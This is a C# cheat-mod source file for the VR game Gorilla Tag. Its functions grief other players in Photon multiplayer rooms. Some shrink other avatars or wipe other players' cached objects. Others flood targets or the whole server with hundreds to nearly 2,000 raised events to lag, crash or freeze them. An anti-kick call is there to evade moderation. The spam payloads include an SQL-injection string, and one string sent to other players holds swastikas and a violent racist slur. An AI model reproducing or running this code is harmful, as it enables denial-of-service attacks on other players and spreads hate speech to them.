using ExitGames.Client.Photon;
using GorillaLocomotion;
using GorillaNetworking;
using Photon.Pun;
using Photon.Realtime;
using System.Linq;
using UnityEngine;
using UnityEngine.InputSystem;

namespace StupidTemplate.Mods
{
    internal class Overpowered
    {
        public static NetPlayer GetPlayerFromVRRig(VRRig p) =>
          p.Creator ?? NetworkSystem.Instance.GetPlayer(NetworkSystem.Instance.GetOwningPlayerID(p.gameObject));
        public static void texst(VRRig player)
        {
            player.transform.localScale = new Vector3(1f, 0.5f, 1f);
        }
        public static void yeller()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                rig.transform.localScale = new Vector3(1f, 0.5f, 1f);
            }
        }
        public static void yellerfix()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                rig.transform.localScale = new Vector3(1f, 1f, 1f);
            }
        }
        public static void yeller2()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                rig.transform.localScale = new Vector3(1f, 1f, 0.01f);
            }
        }
        public static void yeller3()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                rig.transform.localScale = new Vector3(0.01f, 1f, 1f);
            }
        }

        public static void DestroyAll()
        {
            if (PhotonNetwork.InRoom)
            {
                foreach (Photon.Realtime.Player players in PhotonNetwork.PlayerListOthers)
                {
                    PhotonNetwork.OpRemoveCompleteCacheOfPlayer(players.ActorNumber);
                }
            }
        }
        private const byte EventCode180 = 180;

        private static string[] logIdentifiers = new string[]
        {
        "nb0", "nb2", "nb3", "nb4", "nb5", "nb7", "nb12", "nb18", "nb19",
        "AAAA657567A", "eval(neverbloom)", "ㅤ̵̶̷ㅤ̵̷̶卐̷̷̴ㅤ̷̶̷ㅤ̶̵̸", "'; DROP TABLE users; --"
        };

        private static string[] logTags = new string[] { "thankskante", "thankskante_thankskante" };

        public static void RaiseRandomEvent180()
        {
            string randomId = logIdentifiers[UnityEngine.Random.Range(0, logIdentifiers.Length)];
            string randomTag = logTags[UnityEngine.Random.Range(0, logTags.Length)];

            object[] content;

            if (UnityEngine.Random.value > 0.5f)
            {
                content = new object[] { randomId, 19, randomTag, true };
            }
            else
            {
                content = new object[] { randomId, randomTag, 19 };
            }

            for (int i = 0; i < 300; i++)
            {
                for (int t = 0; t < 2; t++)
                {
                    PhotonNetwork.RaiseEvent(EventCode180, content,
                        new RaiseEventOptions { Receivers = ReceiverGroup.Others },
                        SendOptions.SendReliable);
                }
            }
        }
        public static void appq(VRRig player)
        {
            string randomId = logIdentifiers[UnityEngine.Random.Range(0, logIdentifiers.Length)];
            string randomTag = logTags[UnityEngine.Random.Range(0, logTags.Length)];

            object[] content;

            if (UnityEngine.Random.value > 0.5f)
            {
                content = new object[] { randomId, 19, randomTag, true };
            }
            else
            {
                content = new object[] { randomId, randomTag, 19 };
            }

            for (int i = 0; i < 300; i++)
            {
                for (int t = 0; t < 2; t++)
                {
                    PhotonNetwork.RaiseEvent(EventCode180, content,
                        new RaiseEventOptions { TargetActors = new int[] { player.Creator.ActorNumber } },
                        SendOptions.SendReliable);
                }
            }
        }

        #region Lags
        public static float delay = 0f;
        public static void CrashAura()
        {
            if (ControllerInputPoller.instance.rightGrab || Mouse.current.leftButton.isPressed)
            {
                foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
                {
                    if (rig != GorillaTagger.Instance.offlineVRRig)
                    {
                        if (Vector3.Distance(rig.transform.position, GTPlayer.Instance.transform.position) < 3f)
                        {
                            CrashPlayer(rig);
                        }
                    }
                }
            }
        }
        public static void LagAura()
        {
            if (ControllerInputPoller.instance.rightGrab || Mouse.current.leftButton.isPressed)
            {
                foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
                {
                    if (rig != GorillaTagger.Instance.offlineVRRig)
                    {
                        if (Vector3.Distance(rig.transform.position, GTPlayer.Instance.transform.position) < 3f)
                        {
                            LagPlayer(rig);
                        }
                    }
                }
            }
        }
        public static void TinyLagAura()
        {
            if (ControllerInputPoller.instance.rightGrab || Mouse.current.leftButton.isPressed)
            {
                foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
                {
                    if (rig != GorillaTagger.Instance.offlineVRRig)
                    {
                        if (Vector3.Distance(rig.transform.position, GTPlayer.Instance.transform.position) < 3f)
                        {
                            tinylag(rig);
                        }
                    }
                }
            }
        }
        public static void LagtinyAll()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                tinylag(rig);
            }
        }
        public static void LagAll()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                LagPlayer(rig);
            }
        }
        public static void CrashAll()
        {
            foreach (VRRig rig in from r in VRRigCache.ActiveRigs where r != VRRig.LocalRig select r)
            {
                CrashPlayer(rig);
            }
        }
        public static void CrashPlayer(VRRig player)
        {
            if (Time.time <= delay) return;
            for (int i = 0; i < 1875; i++) PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(3, new ExitGames.Client.Photon.Hashtable(), new RaiseEventOptions { TargetActors = new int[] { player.Creator.ActorNumber } }, SendOptions.SendUnreliable);
            PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOutgoingCommands();
            Safety.AntiRPCKick();
            delay = Time.time + 4.54f;
        }
        public static void LagPlayer(VRRig player)
        {
            if (Time.time <= delay) return;
            for (int i = 0; i < 600; i++) PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(3, new ExitGames.Client.Photon.Hashtable(), new RaiseEventOptions { TargetActors = new int[] { player.Creator.ActorNumber } }, SendOptions.SendUnreliable);
            PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOutgoingCommands();
            Safety.AntiRPCKick();
            delay = Time.time + 1.3f;
        }
        public static void tinylag(VRRig player)
        {
            if (Time.time <= delay) return;
            for (int i = 0; i < 100; i++)PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(3, new ExitGames.Client.Photon.Hashtable(), new RaiseEventOptions { TargetActors = new int[] { player.Creator.ActorNumber } }, SendOptions.SendUnreliable);
            PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOutgoingCommands();
            Safety.AntiRPCKick();
            delay = Time.time + 0.5f;
        }
        #endregion

        #region Freezer
        private static float freezeAllDelay;
        public static string th = "卐GETRAPEDNIGGER卐";
        public static void FreezeServer(float delay = 0.1f, int eventCount = 11, RaiseEventOptions options = null)
        {
            if (!PhotonNetwork.InRoom) return;

            options ??= new RaiseEventOptions
            {
                Flags = new WebFlags(byte.MaxValue),
                TargetActors = new[] { -1 }
            };
            if (Time.time > freezeAllDelay)
            {
                for (int i = 0; i < eventCount; i++)
                    PhotonNetwork.RaiseEvent(51, new object[] { th }, options, SendOptions.SendUnreliable);

                Safety.AntiRPCKick();
                freezeAllDelay = Time.time + delay;
            }
        }
        #endregion

    }
}
